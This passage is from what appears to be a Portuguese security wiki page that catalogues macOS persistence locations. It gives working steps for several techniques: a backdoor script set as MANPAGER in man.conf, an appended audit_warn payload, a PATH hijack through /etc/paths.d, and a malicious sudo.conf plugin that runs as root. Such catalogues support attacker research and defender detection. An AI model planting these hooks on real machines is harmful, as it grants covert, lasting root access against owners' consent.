O arquivo de configuração **`/private/etc/man.conf`** indica o binário/script a ser usado ao abrir arquivos de documentação do man. Portanto, o caminho para o executável pode ser modificado para que, sempre que o usuário usar man para ler alguma documentação, um backdoor seja executado.<sup>[[31]](#references)</sup>

Por exemplo, defina em **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

E então crie `/tmp/view` como:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Mas você precisa ser root e o apache precisa estar em execução
- Contorno do TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd não tem entitlements

#### Localização

- **`/etc/apache2/httpd.conf`**
  - Requer root
  - Acionamento: Quando o Apache2 é iniciado

#### Descrição e exploração

Você pode indicar em `/etc/apache2/httpd.conf` que um módulo deve ser carregado adicionando uma linha como:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Dessa forma, seu módulo compilado será carregado pelo Apache. A única coisa é que você precisa **assiná-lo com um certificado Apple válido** ou **adicionar um novo certificado confiável** ao sistema e **assiná-lo** com esse certificado.

Então, se necessário, para garantir que o servidor seja iniciado, você pode executar:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Exemplo de código para o Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Framework de auditoria BSM

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Mas você precisa ser root, o auditd precisa estar em execução e algo deve causar um aviso
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/etc/security/audit_warn`**
  - Requer root
  - **Gatilho**: Quando o auditd detecta um aviso

#### Descrição e Exploit

Sempre que o auditd detecta um aviso, o script **`/etc/security/audit_warn`** é **executado**. Portanto, você pode adicionar seu payload a ele.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Você poderia forçar um aviso com `sudo audit -n`.

### Itens de inicialização

> [!CAUTION] > **Isso foi descontinuado, então nada deveria ser encontrado nesses diretórios.**

O **StartupItem** é um diretório que deve estar localizado em `/Library/StartupItems/` ou `/System/Library/StartupItems/`. Depois de criado, esse diretório deve conter dois arquivos específicos:

1. Um **script rc**: um script de shell executado na inicialização.
2. Um **arquivo plist**, especificamente chamado `StartupParameters.plist`, que contém várias configurações.

Certifique-se de que tanto o script rc quanto o arquivo `StartupParameters.plist` estejam corretamente localizados dentro do diretório **StartupItem** para que o processo de inicialização os reconheça e utilize.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Não consigo encontrar este componente no meu macOS; para mais informações, consulte o writeup.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Introduzido pela Apple, **emond** é um mecanismo de logging que parece estar subdesenvolvido ou possivelmente abandonado, mas continua acessível. Embora não seja particularmente útil para um administrador de Mac, esse serviço obscuro poderia servir como um método sutil de persistência para agentes de ameaças, provavelmente passando despercebido pela maioria dos administradores de macOS.<sup>[[34]](#references)</sup>

Para quem conhece sua existência, identificar qualquer uso malicioso do **emond** é simples. O LaunchDaemon do sistema para esse serviço procura scripts para executar em um único diretório. Para inspecioná-lo, pode-se usar o seguinte comando:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Localização

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Requer root
  - **Acionador**: Com XQuartz

#### Descrição e Exploração

O XQuartz **não é mais instalado no macOS**, então, se quiser mais informações, consulte o writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Instalar um kext é tão complicado, mesmo como root, que isso não é considerado uma técnica prática de sandbox-escape ou persistência, a menos que você tenha um exploit.

#### Localização

Para instalar um KEXT como item de inicialização, ele precisa estar **instalado em um dos seguintes locais**:

- `/System/Library/Extensions`
  - Arquivos KEXT integrados ao sistema operacional OS X.
- `/Library/Extensions`
  - Arquivos KEXT instalados por software de terceiros

Você pode listar os arquivos kext atualmente carregados com:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Para mais informações sobre [**extensões do kernel, consulte esta seção**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Localização

- **`/usr/local/bin/amstoold`**
  - Requer Root

#### Descrição e exploração

Aparentemente, o `plist` de `/System/Library/LaunchAgents/com.apple.amstoold.plist` usava esse binário enquanto expunha um serviço XPC... o problema é que o binário não existia, então você podia colocar algo nesse caminho e, quando o serviço XPC fosse chamado, seu binário seria executado.<sup>[[35]](#references)</sup>

Não consigo mais encontrar isso no meu macOS.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Localização

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Requer Root
  - **Gatilho**: Quando o serviço é executado (raramente)

#### Descrição e exploração

Aparentemente, não é muito comum executar esse script, e não consegui encontrá-lo no meu macOS. Portanto, se quiser mais informações, consulte o writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Isso não funciona nas versões modernas do MacOS**

Também é possível colocar aqui **comandos que serão executados na inicialização.** Exemplo de script rc.common comum:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Tarefas de inicialização do launchd

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Útil para contornar o sandbox: [🔴](https://emojipedia.org/large-red-circle) (requer root)
- Requer root, além de um **SIP bypass** ou da permissão **`kTCCServiceSystemPolicySysAdminFiles`**/Acesso Total ao Disco, dependendo do caminho

#### Localização

`launchd` incorpora um plist em sua seção **`__TEXT,__config`** que descreve "tarefas de inicialização" antecipadas. Vários scripts/binários de referência que **não** existem por padrão e podem ser criados por um invasor:

- Conjunto de SIP bypass: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Conjunto de TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` só existe previamente no Sequoia+)

#### Descrição e exploração

Despeje a tabela de tarefas incorporada para ver quais arquivos `launchd` executará e quais chaves são compatíveis (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Criar um dos arquivos referenciados (por exemplo, `/etc/rc.server`) faz com que `launchd` o execute na próxima reinicialização (do userspace). As entradas mais úteis são protegidas pelo SIP ou exigem TCC SysAdminFiles/Full Disk Access, portanto esta é uma técnica acionada na reinicialização e que requer acesso root.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

A tarefa de inicialização `rc.trampoline` executa um **binário da plataforma (assinado pela Apple)** armazenado na variável NVRAM `apple-trusted-trampoline` durante a inicialização, mas **somente quando o argumento de inicialização `rc.trampoline=1` está definido e o SIP está desativado** (com um limite de tamanho de ~390&nbsp;KB e uma restrição que exige que o processo bloqueie ou retorne rapidamente). Como exige **acesso root + SIP desativado + um payload assinado pela Apple**, é essencialmente impraticável para persistência no mundo real e está listado aqui apenas para fins de completude.<sup>[[41]](#references)</sup>

### /etc/paths e /etc/paths.d (PATH hijack)

- Útil para contornar o sandbox: [🔴](https://emojipedia.org/large-red-circle) (é necessário acesso root para gravar)
- É necessário acesso root

#### Localização

- **`/etc/paths`** e **`/etc/paths.d/*`** — lidos por **`path_helper`** (invocado de `/etc/zprofile`) para montar o `PATH` padrão no login.

#### Descrição e exploração

Ambos pertencem ao root. Colocar um diretório controlado pelo atacante no início da lista (editando `/etc/paths` ou criando um arquivo em `/etc/paths.d/`) faz com que esse diretório apareça no início do `PATH` de todo novo shell de login. Assim, um binário malicioso com o nome de um comando comum (`ls`, `git`, …) **se sobrepõe** ao binário legítimo e é executado na próxima vez que a vítima o invocar.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Útil para bypass de sandbox: [🔴](https://emojipedia.org/large-red-circle) (requer root)
- Requer root; o resultado **bypassa o SIP**. Afeta macOS **15.0–15.1**, corrigido na **15.2**

#### Localização

- Coloque um filesystem bundle em **`/Library/Filesystems/`**.

#### Descrição e exploração

`storagekitd` possui o entitlement **`com.apple.rootless.install.heritable`** e iniciava os binários de filesystem bundles com essa capacidade de bypass do SIP **herdada**. Ao instalar um filesystem bundle malicioso, um atacante poderia executar código com bypass do SIP para instalar **kernel extensions persistentes** ou gravar em diretórios `LaunchDaemon` protegidos pelo SIP — uma persistência que sobrevive e derrota as proteções normais.<sup>[[46]](#references)</sup> A Apple corrigiu o problema no macOS Sequoia 15.2.

### plugins do sudo (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Útil para bypass de sandbox: [🔴](https://emojipedia.org/large-red-circle) (requer root para gravar em `/etc/sudo.conf`)
- Requer root para instalar; depois, o plugin é executado em **toda invocação de `sudo`** (contexto setuid-root)

#### Localização

- **`/etc/sudo.conf`** — linhas `Plugin` carregam objetos compartilhados de **`/usr/libexec/sudo/`** (ou de um caminho absoluto). O arquivo não existe por padrão (o sudo usa uma política integrada), então criá-lo é um hook direto.

#### Descrição e exploração

`sudo` carrega seus plugins de política/aprovação/auditoria de `/etc/sudo.conf`. Como `sudo` é setuid-root, um plugin malicioso de objeto compartilhado é executado com **privilégios de root sempre que qualquer usuário executa `sudo`** — persistência duradoura de root que também observa cada comando sudo.<sup>[[51]](#references)</sup> O macOS inclui o sudo 1.9.x, que oferece suporte à API de plugins.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### Plug-ins CoreMediaIO DAL

Relato: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Exemplo mínimo: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Mecanismo legado:** Descontinuado desde o macOS 12.3. O macOS 14.1 e versões posteriores desativam os plug-ins de vídeo legados por padrão. O usuário precisa restaurar o suporte a vídeo legado pelo Recovery antes que esse caminho possa funcionar; ter um diretório gravável, por si só, não basta. [Orientações de suporte atuais da Apple](https://support.apple.com/en-us/108387).
- É necessário root para gravar no diretório de plug-ins. Qualquer execução de código depende de um cliente compatível que ainda carregue plug-ins DAL; isso não foi testado em tempo de execução no macOS 26.

#### Localização

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - É necessário root
  - **Acionamento:** Um cliente de câmera compatível enumera os dispositivos **após a restauração do suporte legado**. A validação de bibliotecas do cliente pode bloquear um plug-in de terceiros.

#### Descrição e exploração

Os plug-ins **DAL** (Device Abstraction Layer) do CoreMediaIO eram carregados no processo por alguns aplicativos de câmera. A [apresentação da Apple sobre camera extensions](https://developer.apple.com/videos/play/wwdc2022/10022/) afirma especificamente que os plug-ins DAL legados **não** funcionavam com FaceTime, QuickTime Player ou Photo Booth e que muitos outros clientes impõem validação de bibliotecas. As [extensões modernas do Core Media I/O](https://developer.apple.com/documentation/coremediaio) são executadas fora do processo, com um modelo separado de instalação e aprovação. A técnica histórica executada no processo não implica um bypass geral do Camera TCC no macOS atual.<sup>[[53]](#references)[[54]](#references)</sup>

Observação somente leitura no macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` existe e pertence ao root. Nem o suporte legado nem o carregamento por qualquer cliente foram verificados.

### Plug-ins do Directory Service

Relato: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Mecanismo legado e condicional:** Requer root para instalar e um plug-in que esteja realmente configurado e carregado. A API de plug-ins do DirectoryService foi descontinuada; consulte a configuração do Open Directory do Mac de destino antes de considerar isso um acionador na inicialização.

#### Localização

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - É necessário root
  - **Acionamento:** `dspluginhelperd` carrega um plug-in configurado e elegível quando o Open Directory precisa dele. O [guia de tempo de execução de plug-ins da Apple](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) informa que plug-ins não configurados para inicialização podem ser carregados sob demanda quando seu nó é aberto.

#### Descrição e exploração

`dspluginhelperd` oferece suporte a bundles legados de plug-ins do DirectoryService. Um plug-in malicioso pode ser um caminho de execução privilegiada quando o plug-in legado é aceito e ativado, distinto de PAM e Authorization Plugins. A existência do diretório não demonstra que um plug-in recém-gravado será executado na próxima inicialização. Os manuais locais da Apple para `dspluginhelperd(8)` e `opendirectoryd(8)` no macOS 26.5 ainda listam o helper e esse caminho legado.<sup>[[53]](#references)</sup>

Observação somente leitura no macOS 26: `/Library/DirectoryServices/PlugIns` e `/usr/libexec/dspluginhelperd` existem. Nenhum plug-in foi instalado, configurado ou carregado durante este teste.

## Técnicas e ferramentas de persistência

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, o ano do Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Além dos bons e velhos LaunchAgents - 1 - arquivos de inicialização do shell](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Além dos bons e velhos LaunchAgents - 18 - X11 e XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Além dos bons e velhos LaunchAgents - 21 - Aplicativos reabertos](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Além dos bons e velhos LaunchAgents - 20 - Preferências do Terminal](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Além dos bons e velhos LaunchAgents - 13 - Plug-ins de áudio](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Plug-ins Audio Unit (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Além dos bons e velhos LaunchAgents - 12 - Plug-ins QuickLook](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Além dos bons e velhos LaunchAgents - 22 - LoginHook e LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Além dos bons e velhos LaunchAgents - 4 - tarefas cron](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Além dos bons e velhos LaunchAgents - 2 - inicialização do iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Além dos bons e velhos LaunchAgents - 7 - plug-ins do xbar](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Além dos bons e velhos LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Além dos bons e velhos LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Além dos bons e velhos LaunchAgents - 3 - Itens de Início de Sessão](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Além dos bons e velhos LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Além dos bons e velhos LaunchAgents - 24 - Ações de Pasta](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Ações de Pasta para persistência no macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Além dos bons e velhos LaunchAgents - 27 - Atalhos do Dock](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Além dos bons e velhos LaunchAgents - 17 - Seletores de cor](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Além dos bons e velhos LaunchAgents - 26 - Plug-ins Finder Sync](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Análise da persistência do "Mac File Opener" (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Além dos bons e velhos LaunchAgents - 16 - Protetor de tela](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Preservando seu acesso: protetores de tela para persistência no macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Além dos bons e velhos LaunchAgents - 11 - Importadores do Spotlight](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Além dos bons e velhos LaunchAgents - 9 - Painel de Preferências](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Além dos bons e velhos LaunchAgents - 19 - Scripts periódicos](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Além dos bons e velhos LaunchAgents - 5 - Módulos de Autenticação Plugáveis (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Além dos bons e velhos LaunchAgents - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Roubo persistente de credenciais com Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Além dos bons e velhos LaunchAgents - 30 - O arquivo de configuração man - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Além dos bons e velhos LaunchAgents - 25 - Módulos Apache2](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Além dos bons e velhos LaunchAgents - 31 - Estrutura de auditoria BSM](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Além dos bons e velhos LaunchAgents - 23 - emond, o daemon de monitoramento de eventos](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Além dos bons e velhos LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Além dos bons e velhos LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Além dos bons e velhos LaunchAgents - 10 - Arquivos de script de aplicativos](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Além dos bons e velhos LaunchAgents - 32 - Plug-ins de blocos do Dock](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Além dos bons e velhos LaunchAgents - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Além dos bons e velhos LaunchAgents - 34 - Tarefas de inicialização do launchd](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Além dos bons e velhos LaunchAgents - 35 - Persistir por meio da NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [Usando e-mail para persistência no OS X (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Modificação suspeita do Plist de regras do Apple Mail (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Perfis maliciosos - uma das ameaças mais sérias aos Macs (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [A arte do malware para Mac Vol.1 - Cap.0x2 Persistência (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Análise da CVE-2024-44243, um bypass do SIP do macOS por meio de extensões do kernel (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE e exfiltração de tokens de API por meio de arquivos de projeto do Claude Code (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Nova vulnerabilidade no GitHub Copilot e Cursor - backdoor em arquivo de regras (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - Métodos alternativos de instalação (extensões externas)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Remover ExtensionInstallForcelist no Chrome para Mac (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Sobre como escrever plug-ins do Sudo (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Exploração remota de Mac por meio de esquemas de URL personalizados (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Dois truques de persistência no macOS que abusam de plug-ins (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [Exemplo mínimo de CoreMediaIO DAL (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: análise de uma vulnerabilidade de TCC no macOS baseada no Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Documentação do módulo `site` do Python (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Do Spotlight ao Apple Intelligence — abusando de um 0day para roubar os dados que alimentam a IA do macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../banners/hacktricks-training.md}}
